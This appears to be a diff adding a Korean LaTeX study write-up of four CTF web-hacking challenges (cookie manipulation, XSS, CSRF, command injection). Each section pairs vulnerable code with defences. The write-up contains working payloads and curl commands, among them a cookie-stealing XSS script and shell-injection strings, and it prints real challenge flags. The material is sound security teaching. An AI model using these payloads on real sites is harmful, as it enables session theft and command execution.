@@ -1,0 +1,242 @@
+% 웹 해킹 공격 기법 완전 정리
+\documentclass[11pt,a4paper]{article}
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{lmodern}
+\usepackage{hyperref}
+\usepackage{geometry}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{kotex}
+\usepackage{booktabs}
+\usepackage{longtable}
+\geometry{margin=0.8in}
+
+\definecolor{codebg}{rgb}{0.97,0.97,0.97}
+\definecolor{attackcolor}{rgb}{0.8,0.2,0.2}
+\definecolor{defensecolor}{rgb}{0.2,0.6,0.2}
+
+\lstset{
+  basicstyle=\ttfamily\small,
+  backgroundcolor=\color{codebg},
+  frame=single,
+  breaklines=true,
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false,
+}
+
+\title{\textbf{웹 해킹 공격 기법 완전 정리}}
+\author{}
+\date{2025년 11월 17일}
+
+\begin{document}
+\maketitle
+
+\tableofcontents
+\newpage
+
+\section{학습 개요}
+본 문서는 실제 CTF 문제를 통해 학습한 4가지 주요 웹 해킹 공격 기법을 체계적으로 정리한 것입니다.
+
+\textbf{학습한 공격들:} Cookie Manipulation, XSS, CSRF, Command Injection
+
+\section{Cookie Manipulation (쿠키 조작)}
+
+\subsection{개념}
+클라이언트 사이드에 저장된 쿠키 값을 조작하여 권한을 상승시키는 공격
+
+\subsection{취약점 분석}
+\begin{lstlisting}[language=Python]
+# 취약한 코드
+username = request.cookies.get('username', None)
+if username == "admin":
+    return f"flag is {FLAG}"
+\end{lstlisting}
+
+\subsection{공격 과정}
+\begin{enumerate}
+  \item \textbf{정상 로그인}: guest/guest로 로그인하여 username=guest 쿠키 생성
+  \item \textbf{쿠키 조작}: 
+    \begin{itemize}
+      \item 브라우저: F12 → Application → Cookies → username 값을 admin으로 변경
+      \item cURL: \texttt{curl -H "Cookie: username=admin" http://server/}
+    \end{itemize}
+  \item \textbf{플래그 획득}: 페이지 새로고침하면 admin 권한으로 플래그 출력
+\end{enumerate}
+
+\subsection{실제 플래그}
+\texttt{DH\{cookie\_auth\_bypass\_success\}}
+
+\subsection{방어 방법}
+\begin{itemize}
+  \item 서버 사이드 세션 사용
+  \item 쿠키 서명/암호화 (Flask sessions)
+  \item JWT 토큰 사용
+\end{itemize}
+
+\section{XSS-2 (Cross-Site Scripting)}
+
+\subsection{개념}
+악성 스크립트를 웹 페이지에 삽입하여 사용자(봇)의 정보를 탈취하는 공격
+
+\subsection{취약점 분석}
+\begin{lstlisting}[language=JavaScript]
+// 취약한 코드 (vuln.html)
+document.getElementById('vuln').innerHTML = x.get('param');
+\end{lstlisting}
+
+\subsection{공격 과정}
+\begin{enumerate}
+  \item \textbf{XSS 페이로드 작성}:
+\begin{lstlisting}[language=HTML]
+<script>fetch('/memo?memo=' + encodeURIComponent(document.cookie));</script>
+\end{lstlisting}
+  \item \textbf{봇 트리거}: /flag 페이지에서 페이로드 제출
+  \item \textbf{쿠키 탈취}: XSS 스크립트가 봇의 쿠키를 /memo로 전송
+  \item \textbf{플래그 디코딩}: Base64 디코딩하여 최종 플래그 확인
+\end{enumerate}
+
+\subsection{실제 플래그}
+\texttt{DH\{3c01577e9542ec24d68ba0ffb846508f\}}
+
+\subsection{방어 방법}
+\begin{itemize}
+  \item textContent 사용 (innerHTML 대신)
+  \item CSP (Content Security Policy) 적용
+  \item 입력값 필터링 및 이스케이핑
+\end{itemize}
+
+\section{CSRF-1 (Cross-Site Request Forgery)}
+
+\subsection{개념}
+사용자(봇)가 의도하지 않은 요청을 서버에 전송하도록 유도하는 공격
+
+\subsection{취약점 분석}
+\begin{lstlisting}[language=Python]
+@app.route("/admin/notice_flag")
+def admin_notice_flag():
+    if request.remote_addr != "127.0.0.1":
+        return "Access Denied"
+    if request.args.get("userid", "") != "admin":
+        return "Access Denied 2"
+    memo_text += f"[Notice] flag is {FLAG}\n"
+\end{lstlisting}
+
+\subsection{공격 과정}
+\begin{enumerate}
+  \item \textbf{제약 조건 분석}: localhost에서만 접근, userid=admin 필요
+  \item \textbf{CSRF 페이로드 작성}: \texttt{<img src="/admin/notice\_flag?userid=admin">}
+  \item \textbf{봇 속이기}: /flag에서 페이로드 제출하여 봇이 관리자 API 호출
+  \item \textbf{플래그 확인}: /memo에서 플래그 확인
+\end{enumerate}
+
+\subsection{실제 플래그}
+\texttt{DH\{11a230801ad0b80d52b996cbe203e83d\}}
+
+\subsection{방어 방법}
+\begin{itemize}
+  \item CSRF 토큰 사용
+  \item Referer 헤더 검증
+  \item POST 요청 강제
+\end{itemize}
+
+\section{Command Injection-1 (명령어 인젝션)}
+
+\subsection{개념}
+사용자 입력이 시스템 명령어에 직접 삽입되어 임의 명령어를 실행하는 공격
+
+\subsection{취약점 분석}
+\begin{lstlisting}[language=Python]
+# 취약한 코드
+host = request.form.get('host')
+cmd = f'ping -c 3 "{host}"'
+output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
+\end{lstlisting}
+
+\subsection{공격 과정}
+\begin{enumerate}
+  \item \textbf{명령어 구조 분석}: 
+    \begin{itemize}
+      \item 정상: \texttt{ping -c 3 "8.8.8.8"}
+      \item 공격: \texttt{"; cat flag.py; echo "}
+      \item 실행: \texttt{ping -c 3 ""; cat flag.py; echo ""}
+    \end{itemize}
+  \item \textbf{정찰}: \texttt{"; ls -la; echo "} 으로 파일 목록 확인
+  \item \textbf{플래그 탈취}: \texttt{"; cat flag.py; echo "} 으로 플래그 획득
+\end{enumerate}
+
+\subsection{실제 플래그}
+\texttt{DH\{pingpingppppppppping!!\}}
+
+\subsection{방어 방법}
+\begin{itemize}
+  \item 입력값 화이트리스트 검증
+  \item subprocess 대신 안전한 라이브러리 사용
+  \item 쉘 명령어 직접 실행 금지
+\end{itemize}
+
+\section{공격 비교 및 정리}
+
+\begin{longtable}{|p{3cm}|p{2.5cm}|p{3cm}|p{4cm}|}
+\hline
+\textbf{공격 유형} & \textbf{목표} & \textbf{핵심 기법} & \textbf{주요 방어책} \\
+\hline
+Cookie Manipulation & 권한 상승 & 클라이언트 조작 & 서버 세션 \\
+\hline
+XSS & 정보 탈취 & 스크립트 삽입 & 입력 필터링 \\
+\hline
+CSRF & 위조 요청 & 사용자 속임 & CSRF 토큰 \\
+\hline
+Command Injection & 시스템 접근 & 명령어 삽입 & 입력 검증 \\
+\hline
+\end{longtable}
+
+\section{핵심 교훈}
+
+\subsection{공통 패턴}
+\begin{enumerate}
+  \item \textbf{정찰} → 취약점 발견
+  \item \textbf{페이로드 작성} → 공격 코드 개발
+  \item \textbf{실행} → 실제 공격 수행
+  \item \textbf{결과 확인} → 플래그 획득
+\end{enumerate}
+
+\subsection{보안 원칙}
+\begin{itemize}
+  \item \textcolor{attackcolor}{\textbf{사용자 입력을 절대 신뢰하지 말 것}}
+  \item \textcolor{attackcolor}{\textbf{클라이언트 사이드 검증은 보안이 아님}}
+  \item \textcolor{defensecolor}{\textbf{최소 권한 원칙 적용}}
+  \item \textcolor{defensecolor}{\textbf{방어는 다층적으로 구성}}
+\end{itemize}
+
+\section{실습 명령어 모음}
+
+\subsection{Cookie Manipulation}
+\begin{lstlisting}[language=bash]
+# 쿠키 조작 공격
+curl -H "Cookie: username=admin" http://server/
+\end{lstlisting}
+
+\subsection{XSS}
+\begin{lstlisting}[language=bash]
+# XSS 페이로드 전송
+curl -X POST http://server/flag -d "param=<script>fetch('/memo?memo=' + encodeURIComponent(document.cookie));</script>"
+
+# Base64 디코딩
+echo "ZmxhZz1ESHszYzAxNTc3ZTk1NDJlYzI0ZDY4YmEwZmZiODQ2NTA4Zn0=" | base64 -d
+\end{lstlisting}
+
+\subsection{CSRF}
+\begin{lstlisting}[language=bash]
+# CSRF 공격
+curl -X POST http://server/flag -d 'param=<img src="/admin/notice_flag?userid=admin">'
+\end{lstlisting}
+
+\subsection{Command Injection}
+\begin{lstlisting}[language=bash]
+# 명령어 인젝션 공격
+curl -X POST http://server/ping -d 'host="; cat flag.py; echo "'
+\end{lstlisting}
+
+\end{document}
